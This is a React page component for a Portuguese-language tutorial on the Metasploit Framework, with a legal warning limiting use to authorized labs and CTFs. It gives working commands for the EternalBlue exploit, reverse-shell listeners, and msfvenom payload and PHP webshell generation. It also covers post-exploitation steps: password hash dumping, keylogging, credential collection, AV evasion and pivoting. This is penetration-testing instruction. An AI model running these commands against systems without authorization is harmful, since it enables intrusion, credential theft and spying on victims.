import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { ParamsTable } from "@/components/ui/ParamsTable";

export default function Metasploit() {
  return (
    <PageContainer
      title="Metasploit Framework"
      subtitle="A plataforma de exploração mais poderosa do mundo para testes de penetração."
      difficulty="avancado"
      timeToRead="15 min"
    >
      <AlertBox type="danger" title="Uso exclusivo em sistemas autorizados">
        Explorar sistemas sem autorização é crime federal em muitos países, incluindo o Brasil (Lei 12.737/2012). 
        Use apenas em laboratórios, CTFs e sistemas com autorização explícita.
      </AlertBox>

      <h2>Iniciando o Metasploit</h2>
      <CodeBlock language="bash" code={`# Inicializar o banco de dados (primeiro uso)
sudo msfdb init

# Iniciar o console interativo
sudo msfconsole

# Iniciar silencioso (sem banner)
sudo msfconsole -q

# Executar um comando e sair
sudo msfconsole -q -x "use exploit/multi/handler; show options"

# Verificar versão
msfconsole --version`} />

      <AlertBox type="info" title="Ajuda dentro do msfconsole">
        Dentro do Metasploit, use <code>help</code> para ver todos os comandos disponíveis, 
        <code>help COMANDO</code> para detalhes de um comando específico, e <code>info</code> 
        para ver informações completas do módulo carregado — tudo em inglês mas explicado em português abaixo.
      </AlertBox>

      <h2>Comandos principais do msfconsole</h2>
      <CodeBlock language="bash" code={`# Dentro do msfconsole:

# Ajuda geral
help
help search

# Pesquisar módulos
search type:exploit platform:windows smb
search cve:2021-44228         # Log4Shell
search ms17-010               # EternalBlue
search wordpress               # exploits para WordPress

# Selecionar módulo
use exploit/windows/smb/ms17_010_eternalblue
use 0   # usar pelo número do search

# Ver informações do módulo
info
show description
show options
show advanced
show payloads

# Configurar opções
set RHOSTS 192.168.1.1
set RPORT 445
set LHOST 192.168.1.100
set LPORT 4444
setg LHOST 192.168.1.100      # setg = define globalmente

# Executar
run
exploit`} />

      <ParamsTable
        title="Comandos do msfconsole — explicados em português"
        params={[
          { flag: "search TERMO", desc: "Pesquisa módulos por nome, CVE, plataforma, tipo, etc. Retorna lista numerada.", exemplo: "search ms17-010" },
          { flag: "use MÓDULO", desc: "Seleciona um módulo para usar. Pode usar o caminho completo ou o número do search.", exemplo: "use exploit/windows/smb/ms17_010_eternalblue" },
          { flag: "info", desc: "Exibe informações completas do módulo selecionado: descrição, referências CVE, opções, plataformas.", exemplo: "info" },
          { flag: "show options", desc: "Mostra as opções do módulo atual: nome, valor atual, se é obrigatório e descrição.", exemplo: "show options" },
          { flag: "show advanced", desc: "Mostra opções avançadas do módulo — configurações menos comuns mas importantes.", exemplo: "show advanced" },
          { flag: "show payloads", desc: "Lista todos os payloads compatíveis com o exploit selecionado.", exemplo: "show payloads" },
          { flag: "set OPÇÃO VALOR", desc: "Define o valor de uma opção do módulo atual.", exemplo: "set RHOSTS 192.168.1.1" },
          { flag: "setg OPÇÃO VALOR", desc: "Define globalmente (g=global) uma opção para todos os módulos. Evita redigitar LHOST/LPORT.", exemplo: "setg LHOST 10.10.14.1" },
          { flag: "unset OPÇÃO", desc: "Limpa o valor de uma opção.", exemplo: "unset PAYLOAD" },
          { flag: "run / exploit", desc: "Executa o módulo com as opções configuradas.", exemplo: "run" },
          { flag: "check", desc: "Verifica se o alvo é vulnerável SEM explorar. Nem todos os módulos suportam.", exemplo: "check" },
          { flag: "back", desc: "Volta ao menu principal sem descartar as configurações.", exemplo: "back" },
          { flag: "sessions", desc: "Lista todas as sessões abertas (shells, meterpreter).", exemplo: "sessions" },
          { flag: "sessions -i N", desc: "Abre (interage com) a sessão número N.", exemplo: "sessions -i 1" },
          { flag: "sessions -k N", desc: "Mata (encerra) a sessão número N.", exemplo: "sessions -k 1" },
          { flag: "jobs", desc: "Lista módulos rodando em background.", exemplo: "jobs" },
          { flag: "db_nmap ARGS", desc: "Roda o Nmap e importa os resultados direto no banco do Metasploit.", exemplo: "db_nmap -sV -sC 192.168.1.1" },
          { flag: "hosts", desc: "Lista hosts descobertos e armazenados no banco de dados.", exemplo: "hosts" },
          { flag: "services", desc: "Lista serviços encontrados em todos os hosts.", exemplo: "services" },
          { flag: "vulns", desc: "Lista vulnerabilidades encontradas.", exemplo: "vulns" },
        ]}
      />

      <h2>Opções RHOSTS, LHOST — entendendo cada uma</h2>
      <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 my-6">
        {[
          { opt: "RHOSTS", desc: "Remote HOSTS — IP(s) alvo do exploit. Aceita IP único, range (192.168.1.1-10), CIDR (/24) ou arquivo com file:///lista.txt" },
          { opt: "RPORT", desc: "Remote PORT — porta do serviço alvo. Preenchida automaticamente pelo módulo mas pode ser alterada." },
          { opt: "LHOST", desc: "Local HOST — seu IP (onde o payload vai se conectar de volta). Use sua VPN IP no HackTheBox/TryHackMe." },
          { opt: "LPORT", desc: "Local PORT — porta onde você vai ouvir a conexão reversa do alvo. Padrão é 4444." },
          { opt: "PAYLOAD", desc: "O código que roda no alvo após explorar. Define o tipo de acesso (shell, meterpreter, etc.)." },
          { opt: "TARGET", desc: "Versão específica do alvo quando um exploit funciona diferente para cada versão do SO/aplicação." },
        ].map((item, i) => (
          <div key={i} className="bg-card border border-border rounded-lg p-3 text-sm">
            <code className="text-primary font-mono text-xs">{item.opt}</code>
            <p className="text-xs text-muted-foreground mt-1">{item.desc}</p>
          </div>
        ))}
      </div>

      <h2>Payloads — o que é executado no alvo</h2>
      <CodeBlock language="bash" code={`# Ver payloads compatíveis com o módulo atual
show payloads

# Payloads mais usados:
set PAYLOAD windows/x64/meterpreter/reverse_tcp   # Windows 64-bit, Meterpreter reverso
set PAYLOAD windows/meterpreter/reverse_tcp        # Windows 32-bit, Meterpreter reverso
set PAYLOAD linux/x86/meterpreter/reverse_tcp      # Linux 32-bit
set PAYLOAD linux/x64/meterpreter/reverse_tcp      # Linux 64-bit
set PAYLOAD cmd/unix/reverse_bash                  # Bash reverse shell simples
set PAYLOAD java/meterpreter/reverse_tcp           # Java (multiplataforma)`} />

      <ParamsTable
        title="Tipos de payload — explicados em português"
        params={[
          { flag: "reverse_tcp", desc: "O alvo CONECTA DE VOLTA para você (seu LHOST:LPORT). O mais usado — funciona mesmo atrás de firewall.", exemplo: "windows/meterpreter/reverse_tcp" },
          { flag: "bind_tcp", desc: "Abre uma porta no ALVO e você se conecta a ele. Bom quando você não pode receber conexão reversa.", exemplo: "windows/meterpreter/bind_tcp" },
          { flag: "reverse_https", desc: "Conexão reversa encriptada em HTTPS. Mais difícil de detectar por IDS/antivírus.", exemplo: "windows/meterpreter/reverse_https" },
          { flag: "meterpreter", desc: "Payload avançado que roda em memória (sem criar arquivo em disco). Funcionalidades extras: upload, download, keylogger, pivot, etc.", exemplo: "windows/x64/meterpreter/reverse_tcp" },
          { flag: "shell", desc: "Payload simples que retorna um shell de sistema operacional (cmd.exe ou /bin/sh).", exemplo: "windows/shell/reverse_tcp" },
          { flag: "staged (/ no nome)", desc: "O payload é enviado em duas partes: o stager primeiro conecta, depois recebe o stage. Menor, melhor bypass de AV.", exemplo: "windows/meterpreter/reverse_tcp" },
          { flag: "stageless (sem /)", desc: "Payload completo em um único arquivo. Não precisa de conexão de segunda etapa.", exemplo: "windows/meterpreter_reverse_tcp" },
        ]}
      />

      <h2>Meterpreter — comandos essenciais</h2>
      <CodeBlock language="bash" code={`# Dentro de uma sessão Meterpreter:

# Informações do sistema
sysinfo        # SO, hostname, arquitetura
getuid         # usuário atual no alvo
getpid         # processo onde o meterpreter está rodando

# Navegação
pwd            # diretório atual
ls             # listar arquivos
cd pasta/      # mudar diretório
cat arquivo    # ler arquivo

# Transferência de arquivos
upload arquivo.exe C:\\Windows\\Temp\\
download C:\\Users\\admin\\Desktop\\flag.txt .

# Elevação de privilégio
getsystem      # tenta automaticamente virar SYSTEM
run post/multi/recon/local_exploit_suggester

# Dumpar senhas
hashdump       # hashes SAM do Windows (requer SYSTEM)

# Shell do OS
shell          # abre cmd.exe ou /bin/bash
Ctrl+Z         # volta para o meterpreter sem fechar o shell

# Colocar em background e voltar
background
sessions -l    # listar sessões
sessions -i 1  # voltar para sessão 1`} />

      <ParamsTable
        title="Meterpreter — comandos em português"
        params={[
          { flag: "sysinfo", desc: "Exibe informações do sistema: nome do host, SO, arquitetura e domínio." },
          { flag: "getuid", desc: "Mostra com qual usuário o Meterpreter está rodando no alvo." },
          { flag: "getsystem", desc: "Tenta automaticamente elevar privilégios para SYSTEM (Windows) usando técnicas conhecidas." },
          { flag: "hashdump", desc: "Extrai os hashes NTLM dos usuários do Windows (SAM). Requer SYSTEM. Útil para Pass-the-Hash ou cracking offline com Hashcat." },
          { flag: "upload ARQUIVO DESTINO", desc: "Envia um arquivo do seu computador para o alvo.", exemplo: "upload nc.exe C:\\Temp\\" },
          { flag: "download ARQUIVO DESTINO", desc: "Baixa um arquivo do alvo para seu computador.", exemplo: "download C:\\flag.txt ." },
          { flag: "shell", desc: "Abre um shell de sistema operacional (cmd.exe no Windows, /bin/sh no Linux). Ctrl+Z volta para Meterpreter." },
          { flag: "background / bg", desc: "Coloca a sessão em background sem encerrá-la. Volte com: sessions -i N" },
          { flag: "run MÓDULO", desc: "Executa um módulo post-exploitation na sessão atual.", exemplo: "run post/windows/gather/credentials/credential_collector" },
          { flag: "migrate PID", desc: "Move o Meterpreter para outro processo. Útil para estabilidade e evasão de AV.", exemplo: "migrate 1234" },
          { flag: "keyscan_start", desc: "Inicia um keylogger em memória. Use keyscan_dump para ver o capturado, keyscan_stop para parar." },
          { flag: "portfwd add", desc: "Redireciona uma porta local sua para uma porta na rede interna do alvo (pivoting).", exemplo: "portfwd add -l 8080 -p 80 -r 10.0.0.5" },
          { flag: "screenshot", desc: "Captura uma screenshot da tela do alvo (Windows com sessão de usuário ativa)." },
        ]}
      />

      <h2>Exploit multi/handler — recebendo shells</h2>
      <CodeBlock language="bash" code={`# Listener para receber conexões de payloads gerados com msfvenom
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
set ExitOnSession false    # não para ao receber primeira conexão
run -j                      # -j = roda em background (job)`} />

      <ParamsTable
        title="Opções do multi/handler — explicadas"
        params={[
          { flag: "ExitOnSession false", desc: "Mantém o listener ativo mesmo após receber a primeira conexão. Essencial quando espera múltiplas sessões.", exemplo: "set ExitOnSession false" },
          { flag: "run -j", desc: "Executa o handler em background como um job. Libera o console para outros comandos. Veja com: jobs", exemplo: "run -j" },
          { flag: "AutoRunScript SCRIPT", desc: "Executa automaticamente um script Meterpreter assim que receber uma sessão.", exemplo: "set AutoRunScript post/multi/manage/shell_to_meterpreter" },
          { flag: "ReverseAllowProxy true", desc: "Permite receber conexões mesmo que o alvo use proxy intermediário.", exemplo: "set ReverseAllowProxy true" },
        ]}
      />

      <h2>Gerando payloads com msfvenom</h2>
      <CodeBlock language="bash" code={`# Listar todos os payloads
msfvenom --list payloads

# Listar formatos de saída
msfvenom --list formats

# EXE Windows 64-bit Meterpreter reverso
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f exe -o payload.exe

# PHP webshell Meterpreter
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f raw -o shell.php

# ELF Linux reverso
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f elf -o payload.elf && chmod +x payload.elf`} />

      <ParamsTable
        title="msfvenom — flags principais em português"
        params={[
          { flag: "-p PAYLOAD", desc: "Payload a gerar. Use --list payloads para ver todos os disponíveis.", exemplo: "-p windows/x64/meterpreter/reverse_tcp" },
          { flag: "LHOST / LPORT", desc: "Opções do payload passadas diretamente: IP e porta onde você vai receber a conexão." },
          { flag: "-f FORMATO", desc: "Formato do arquivo de saída: exe, elf, raw, php, py, js_le, dll, asp, war, jar, etc.", exemplo: "-f exe" },
          { flag: "-o ARQUIVO", desc: "Nome do arquivo de saída.", exemplo: "-o payload.exe" },
          { flag: "-e ENCODER", desc: "Codificador para obfuscar o payload e tentar bypassar AV.", exemplo: "-e x86/shikata_ga_nai" },
          { flag: "-i ITERAÇÕES", desc: "Número de vezes que o encoder é aplicado. Mais iterações = mais ofuscação.", exemplo: "-i 5" },
          { flag: "-b '\\x00'", desc: "Bad bytes a evitar no payload (caracteres que o exploit não pode conter).", exemplo: "-b '\\x00\\x0a\\x0d'" },
          { flag: "--list payloads", desc: "Lista todos os payloads disponíveis no Metasploit.", exemplo: "msfvenom --list payloads | grep windows" },
          { flag: "--list formats", desc: "Lista todos os formatos de arquivo de saída suportados.", exemplo: "msfvenom --list formats" },
        ]}
      />
    </PageContainer>
  );
}
